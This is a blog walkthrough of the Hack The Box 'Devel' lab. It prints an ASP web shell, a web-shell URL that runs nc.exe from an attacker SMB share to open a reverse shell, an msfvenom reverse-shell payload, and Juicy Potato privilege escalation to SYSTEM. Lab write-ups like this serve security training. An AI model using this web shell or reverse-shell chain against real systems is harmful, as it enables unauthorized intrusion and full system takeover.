@@ -1,0 +1,165 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Devel Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Devel Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#iis_apppool\web">Shell - iis apppool\web</a></li>
+        <li><a href="#root">Shell - SYSTEM</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>Devel is a fairly simple box.  We have read/write permissions to the FTP server.  The FTP server also provides access to the root directory of the web server so uploading a web shell is very simple.  Privesc involved exploiting SeImpersonatePrivilege using Juicy.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Wed Oct 13 12:35:00 2021 as: nmap -p- -oN ping_tcp 10.129.235.238&#13;&#10;Nmap scan report for 10.129.235.238&#13;&#10;Host is up (0.042s latency).&#13;&#10;Not shown: 65533 filtered ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;21/tcp open  ftp&#13;&#10;80/tcp open  http&#13;&#10;&#13;&#10;# Nmap done at Wed Oct 13 12:36:54 2021 -- 1 IP address (1 host up) scanned in 113.72 seconds&#13;&#10;    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Wed Oct 13 12:37:11 2021 as: nmap -p21,80 -sV -sC -oN script_tcp 10.129.235.238&#13;&#10;Nmap scan report for 10.129.235.238&#13;&#10;Host is up (0.041s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;21/tcp open  ftp     Microsoft ftpd&#13;&#10;| ftp-anon: Anonymous FTP login allowed (FTP code 230)&#13;&#10;| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client&#13;&#10;| 03-17-17  05:37PM                  689 iisstart.htm&#13;&#10;|_03-17-17  05:37PM               184946 welcome.png&#13;&#10;| ftp-syst: &#13;&#10;|_  SYST: Windows_NT&#13;&#10;80/tcp open  http    Microsoft IIS httpd 7.5&#13;&#10;| http-methods: &#13;&#10;|_  Potentially risky methods: TRACE&#13;&#10;|_http-server-header: Microsoft-IIS/7.5&#13;&#10;|_http-title: IIS7&#13;&#10;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Wed Oct 13 12:37:26 2021 -- 1 IP address (1 host up) scanned in 14.64 seconds&#13;&#10;    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>I begin with taking a look at the website on port 80.</li>
+
+    <img src="../images/devel/port80.png">
+
+    <li>It appears to be a default splash screen for IIS7.  Nothing else interesting stands out from this page so I move to ftp on port 21.  I attempt logging in with the credentials anonymous:anonymous ad it works.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ ftp 10.129.221.155&#13;&#10;Connected to 10.129.221.155.&#13;&#10;220 Microsoft FTP Service&#13;&#10;Name (10.129.221.155:kali): anonymous&#13;&#10;534 Local policy on server does not allow TLS secure connections.&#13;&#10;534 Local policy on server does not allow TLS secure connections.&#13;&#10;SSL not available&#13;&#10;331 Anonymous access allowed, send identity (e-mail name) as password.&#13;&#10;Password:&#13;&#10;230 User logged in.&#13;&#10;Remote system type is Windows_NT.&#13;&#10;ftp&gt; ls&#13;&#10;200 PORT command successful.&#13;&#10;125 Data connection already open; Transfer starting.&#13;&#10;03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client&#13;&#10;03-17-17  05:37PM                  689 iisstart.htm&#13;&#10;03-17-17  05:37PM               184946 welcome.png&#13;&#10;226 Transfer complete.&#13;&#10;ftp&gt; &#13;&#10;    </pre>
+
+    <li>It appears we have FTP access to the web servers root directory.  Now I will test to see if we can write to the server.</li>
+
+    <pre>&#13;&#10;ftp&gt; put test.txt &#13;&#10;local: test.txt remote: test.txt&#13;&#10;200 PORT command successful.&#13;&#10;125 Data connection already open; Transfer starting.&#13;&#10;226 Transfer complete.&#13;&#10;12 bytes sent in 0.00 secs (195.3125 kB/s)&#13;&#10;ftp&gt; &#13;&#10;    </pre>
+
+    <li>It allowed me to upload my text.txt file, so we know we have write access.  The test.txt file only contains the text "testing123".  Now I go to the website and see if I can access this page.</li>
+
+    <img src="../images/devel/test.png">
+
+    <br>
+    <br>
+    <h2><a id="iis_apppool\web">Shell - iis apppool\web</a></h2>
+
+    <li>I have now confirmed that we are able to upload files to the web server and access them.  This time I will upload a web shell.  It is an IIS server so I will use an asp webshell.  aspx would probably also work.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ cat shell.asp      &#13;&#10;&lt;%response.write CreateObject(&quot;WScript.Shell&quot;).Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.Readall()%&gt;&#13;&#10;    </pre>
+
+    <li>Now I upload it using ftp</li>
+
+    <pre>&#13;&#10;ftp&gt; put shell.asp&#13;&#10;local: shell.asp remote: shell.asp&#13;&#10;200 PORT command successful.&#13;&#10;125 Data connection already open; Transfer starting.&#13;&#10;226 Transfer complete.&#13;&#10;100 bytes sent in 0.00 secs (1.7340 MB/s)&#13;&#10;ftp&gt; &#13;&#10;    </pre>
+
+    <li>Now I access it using firefox.  Initially I tried the command "whoami" but the web shell was not outputting any information.  However, when I added cmd /c in front of whoami it did successfuly run the command.</li>
+
+    <img src="../images/devel/whoami.png">
+
+    <br>
+    <br>
+
+    <li>We have command execution.  Now we need to get a reverse shell to connect back to a netcat listener.  I set my netcat listener on 4444.  I used rlwrap before nc so that when I do get a shell I will have the ability to use my arrow keys on the command line (i.e. up/down to cycle through previous commands.  left/right to move forward and backward on current command).</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ rlwrap nc -lvnp 4444                                                                                       127 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;    </pre>
+
+    <li>It took a while to figure out a command to get the reverse shell to work.  I was finally able to get it to work by running and smb server on my kali box and running the command from there on the victim machine.</li>
+
+    <br>
+
+    <li>First I setup my smb server</li>
+    
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ sudo impacket-smbserver share .                                                                            130 &Cross;&#13;&#10;Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation&#13;&#10;&#13;&#10;[*] Config file parsed&#13;&#10;[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0&#13;&#10;[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0&#13;&#10;[*] Config file parsed&#13;&#10;[*] Config file parsed&#13;&#10;[*] Config file parsed&#13;&#10;    </pre>
+
+    <li>Next I put a netcat executable in this directory so I can call it from the victim machine and get my reverse shell.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ locate nc.exe                                                                 &#13;&#10;/home/kali/Documents/htb/BankRobber/nc.exe&#13;&#10;/home/kali/Documents/htb/Blackfield/exfiltrated/SMB_audit2020/forensic/tools/sysinternals/sync.exe&#13;&#10;/home/kali/Documents/htb/Jeeves/nc.exe&#13;&#10;/home/kali/Documents/htb/Querier/nc.exe&#13;&#10;/srv/SMB/nc.exe&#13;&#10;/usr/lib/mono/4.5/cert-sync.exe&#13;&#10;/usr/share/seclists/Web-Shells/FuzzDB/nc.exe&#13;&#10;/usr/share/windows-resources/binaries/nc.exe&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ cp /usr/share/windows-resources/binaries/nc.exe .  &#13;&#10;    </pre>
+
+    <li>Now I send my command through the webshell.</li>
+
+    <pre>&#13;&#10;http://10.129.221.155/shell.asp?cmd=\\10.10.14.83\share\nc.exe%20-e%20cmd.exe%2010.10.14.83%204444&#13;&#10;    </pre>
+
+    <li>On my netcat listener I gain a reverse shell connection.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ rlwrap nc -lvnp 4444                                                                                       127 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;Ncat: Connection from 10.129.221.155.&#13;&#10;Ncat: Connection from 10.129.221.155:49158.&#13;&#10;Microsoft Windows [Version 6.1.7600]&#13;&#10;Copyright (c) 2009 Microsoft Corporation.  All rights reserved.&#13;&#10;&#13;&#10;whoami&#13;&#10;whoami&#13;&#10;iis apppool\web&#13;&#10;&#13;&#10;c:\windows\system32\inetsrv&gt;&#13;&#10;    </pre>
+
+    <br>
+    <h2><a id="root">Shell - SYSTEM</a></h2>
+
+    <li>On Windows, the web user typically has the SeImpersonatePrivilege set to enabled.  With this privilege enabled on Windows we are able to use a potatoe exploit in order to privesc to nt authority \ system.  This is also an older system and requires a 32-bit binary. We can confirm this using systeminfo.</li>
+
+    <pre>&#13;&#10;c:\windows\system32\inetsrv&gt;&#13;&#10;systeminfo&#13;&#10;systeminfo&#13;&#10;&#13;&#10;Host Name:                 DEVEL&#13;&#10;OS Name:                   Microsoft Windows 7 Enterprise &#13;&#10;OS Version:                6.1.7600 N/A Build 7600&#13;&#10;OS Manufacturer:           Microsoft Corporation&#13;&#10;OS Configuration:          Standalone Workstation&#13;&#10;OS Build Type:             Multiprocessor Free&#13;&#10;Registered Owner:          babis&#13;&#10;Registered Organization:   &#13;&#10;Product ID:                55041-051-0948536-86302&#13;&#10;Original Install Date:     17/3/2017, 4:17:31 &#65533;&#65533;&#13;&#10;System Boot Time:          14/10/2021, 12:18:25 &#65533;&#65533;&#13;&#10;System Manufacturer:       VMware, Inc.&#13;&#10;System Model:              VMware Virtual Platform&#13;&#10;<marK>System Type:               X86-based PC</marK>&#13;&#10;Processor(s):              1 Processor(s) Installed.&#13;&#10;                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz&#13;&#10;BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018&#13;&#10;Windows Directory:         C:\Windows&#13;&#10;System Directory:          C:\Windows\system32&#13;&#10;Boot Device:               \Device\HarddiskVolume1&#13;&#10;System Locale:             el;Greek&#13;&#10;Input Locale:              en-us;English (United States)&#13;&#10;Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul&#13;&#10;Total Physical Memory:     3.071 MB&#13;&#10;Available Physical Memory: 2.452 MB&#13;&#10;Virtual Memory: Max Size:  6.141 MB&#13;&#10;Virtual Memory: Available: 5.538 MB&#13;&#10;Virtual Memory: In Use:    603 MB&#13;&#10;Page File Location(s):     C:\pagefile.sys&#13;&#10;Domain:                    HTB&#13;&#10;Logon Server:              N/A&#13;&#10;Hotfix(s):                 N/A&#13;&#10;Network Card(s):           1 NIC(s) Installed.&#13;&#10;                           [01]: vmxnet3 Ethernet Adapter&#13;&#10;                                 Connection Name: Local Area Connection 4&#13;&#10;                                 DHCP Enabled:    Yes&#13;&#10;                                 DHCP Server:     10.129.0.1&#13;&#10;                                 IP address(es)&#13;&#10;                                 [01]: 10.129.221.155&#13;&#10;                                 [02]: fe80::dd64:3cd6:309e:1466&#13;&#10;    </pre>
+
+    <li>I googled for "32 bit juicy potato" and came accross the link https://github.com/ivanitlearning/Juicy-Potato-x86/releases.  I download the execuable to my kali machine inside the directory of the smb share.</li>
+
+    <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe&#13;&#10;                (Removed Lines)&#13;&#10;HTTP request sent, awaiting response... 200 OK&#13;&#10;Length: 263680 (258K) [application/octet-stream]&#13;&#10;Saving to: &OpenCurlyQuote;Juicy.Potato.x86.exe&rsquor;&#13;&#10;&#13;&#10;Juicy.Potato.x86.exe          100%[==============================================&gt;] 257.50K  --.-KB/s    in 0.07s   &#13;&#10;&#13;&#10;2021-10-13 17:55:18 (3.43 MB/s) - &OpenCurlyQuote;Juicy.Potato.x86.exe&rsquor; saved [263680/263680]&#13;&#10;    </pre>
+
+    <li>Then I rename it jp.exe for easy typing.</li>
+
+    <pre>&#13;&#10;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ mv Juicy.Potato.x86.exe jp.exe&#13;&#10;    </pre>
+
+    <li>Now I run the juicy potato exploit</li>
+
+    <img src="../images/devel/jp1.png">
+
+    <br>
+    <br>
+
+    <li>It appears I am getting an error while trying to run Juicy Potato.  When running Juicy Potato without the -c flag it will choose a CLSID for us while running the exploit.  Sometimes in order to get Juicy Potato to work properly we need to choose a different CLSID.  I go to google and search "juicy potato CLSID" and that brings me to this link: http://ohpe.it/juicy-potato/CLSID/.  The systeminfo command tells us that this is Windows 7 Enterprise so we choose that from the list.</li>
+
+    <img src="../images/devel/clsid_list.png">
+
+    <br>
+    <br>
+
+    <li>There is a script that will automate the process of trying CLSID's for us, but this is not necessary on this box.  I simply try the first few on the list manually.  I begin with ShellHWDetection, since it is on the top of the list.  The CLSID for this one is {555F3418-D99E-4E51-800A-6E89CFD8B1D7}.  So I give it a try.</li>
+
+    <img src="../images/devel/jp2.png">
+
+    <br>
+    <br>
+
+    <li>That CLSID did not work either.  So move to the next one in the list.  BITS with a CLSID of {03ca98d6-ff5d-49b8-abc6-03dd84127020}</li>
+
+    <img src="../images/devel/jp3.png">
+
+    <br>
+    <br>
+
+    <li>According to the exploit output it is execution commands succcessfuly as "NT AUTHORITY\SYSTEM".  However, I am not getting a reverse shell using nc.exe for some reason.  Instead, I generate a shell.exe file using msfvenom and transfer that to C:\windows\temp\shell.exe on the victim machine.</li>
+
+    <ul>
+        <li>Creating the shell file.</li>
+            <pre>&#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Devel]&#13;&#10;&boxur;&HorizontalLine;$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f exe &gt; shell.exe&#13;&#10;[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload&#13;&#10;[-] No arch selected, selecting arch: x86 from the payload&#13;&#10;No encoder specified, outputting raw payload&#13;&#10;Payload size: 324 bytes&#13;&#10;Final size of exe file: 73802 bytes&#13;&#10;    </pre>
+            
+        <li>Moving shell.exe to C:\windows\temp\shell.exe</li>
+
+        <pre>&#13;&#10;C:\&gt;&#13;&#10;copy \\10.10.14.83\share\shell.exe C:\windows\temp\shell.exe&#13;&#10;copy \\10.10.14.83\share\shell.exe C:\windows\temp\shell.exe&#13;&#10;        1 file(s) copied.&#13;&#10;        </pre>
+    </ul>
+
+    <li>Now I execute the shell.exe file using Juicy Potato and receive an "nt authority\system shell on my netcat listener.</li>
+
+    <img src="../images/devel/shell.png">
+
+
+
+
+</body>
+
+</html>
+
